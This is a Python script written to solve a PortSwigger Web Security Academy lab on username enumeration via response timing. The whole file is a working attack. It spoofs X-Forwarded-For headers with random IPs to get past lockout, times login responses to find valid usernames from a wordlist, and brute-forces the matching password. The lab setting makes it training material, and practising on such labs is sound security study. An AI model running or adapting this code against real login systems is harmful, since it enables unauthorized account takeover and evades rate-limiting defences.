# A simple python program made to solve the following PortSwigger Lab:
# https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing

import requests
import random
import time

SCHEME = "HTTPS://"
URL = "web-security-academy.net"
PATH = "/login"
SUB_DOMAIN = "" # Change This Line With Labs Subdomain
FULL_PATH = SCHEME + SUB_DOMAIN + "." + URL + PATH
USERNAME_FILE = "./username-wordlist.txt"
PASSWORD_FILE = "./password-wordlist.txt"
VALID_USERNAME = "wiener" # Needed to establish baseline
FAKE_USERNAME = "notarealperson" # Needed to establish baseline
FAKE_PASSWORD = "not-a-real-password-just-an-obscenely-long-password" # Needed to establish baseline
REQUESTS = 15
SUCCESS_STATUS_CODE = 302
LEEWAY_SECONDS = 0.10

def appendFileLinesToArray(file_name):
    print(f"Loading {file_name}")
    array = []
    with open(file_name, 'r') as file:
        for line in file:
            array.append(line.strip())
    return array

# IP Address Needs To Be Spoofed In Order To Bypass Lockout
def generateIPAddress():
    four_random_nums = [str(random.randint(1, 255)) for i in range(4)]
    random_ip = ".".join(four_random_nums)
    print(f"Random IP Address Generated: {random_ip}")
    return random_ip

def craftPostHeaderAndData(usern, passw):
    headers = {"X-Forwarded-For" : generateIPAddress()}
    data = {"username": usern, "password": passw}
    print(f"\nX-Forwarded-For Header Has Been Set With IP Address {headers['X-Forwarded-For']}")
    print(f"POST Data has been set with the following username and password... {data['username']}:{data['password']}")
    return headers, data

def getAverageResponseTime(usern, passw):
    times = []
    for i in range(REQUESTS):
        headers, data = craftPostHeaderAndData(usern, passw)
        print(f"Sending POST Request {i + 1} of {REQUESTS}, Collecting Response Times...")
        start_time = time.time()
        response = requests.post(FULL_PATH, headers = headers, data = data)
        end_time = time.time()
        times.append(end_time - start_time)
    return sum(times) / len(times)

def getBaselines():
    # Get average time it takes for server to respond to false credentials
    print(f"Getting Baseline For False Credentials...")
    time_for_false_creds = getAverageResponseTime(FAKE_USERNAME, FAKE_PASSWORD)
    # Get average time it takes for server to respond to valid username and false password
    print(f"Getting Baseline For Valid Username With Fake Password...")
    time_for_val_user_fake_pass = getAverageResponseTime(VALID_USERNAME, FAKE_PASSWORD)
    return [time_for_false_creds, time_for_val_user_fake_pass]

def findUsername(target_req_time):
    usernames = appendFileLinesToArray(USERNAME_FILE)
    possible_usernames = []
    for username in usernames:
        headers, data = craftPostHeaderAndData(username, FAKE_PASSWORD)
        start_time = time.time()
        response = requests.post(FULL_PATH, headers = headers, data = data)
        end_time = time.time()
        response_time = end_time - start_time
        if response_time >= (target_req_time - LEEWAY_SECONDS):
            print(f"Possible User Found: {username}")
            possible_usernames.append(username)
    return possible_usernames

def compare_users(list_of_users):
    best_time = None
    username = ''
    for user in list_of_users:
        average_time = getAverageResponseTime(user, FAKE_PASSWORD)
        if best_time == None or average_time > best_time:
            best_time = average_time
            username = user
    return username

def find_password(user):
    passwords = appendFileLinesToArray(PASSWORD_FILE)
    for password in passwords:
        headers, data = craftPostHeaderAndData(user, password)
        response = requests.post(FULL_PATH, headers = headers, data = data, allow_redirects=False)
        if response.status_code == SUCCESS_STATUS_CODE:
            print(f"Possible Password Found: {password}")
            return password
    return None


def main():
    print(f"Program Starting...\n")
    print(f"Target URL: {FULL_PATH}")
    print(f"Usernames Loaded From: {USERNAME_FILE}")
    print(f"Passwords Loaded From: {PASSWORD_FILE}\n")
    baselines = getBaselines()
    print(f"Average Time For False Credentials: {baselines[0]}")
    print(f"Average Time For Valid Username With Fake Password: {baselines[1]}\n")
    possible_usernames = findUsername(baselines[1])
    if possible_usernames:
        print(f"Possible Usernames: {possible_usernames}")
        user = compare_users(possible_usernames)
        password = find_password(user)
        print(f"Possible Match Found... USERNAME: {user}, PASSWORD: {password}")
    else:
        print("Something went wrong trying to find usernames.")
        return 1
    return 0

if __name__ == "__main__":
    main()
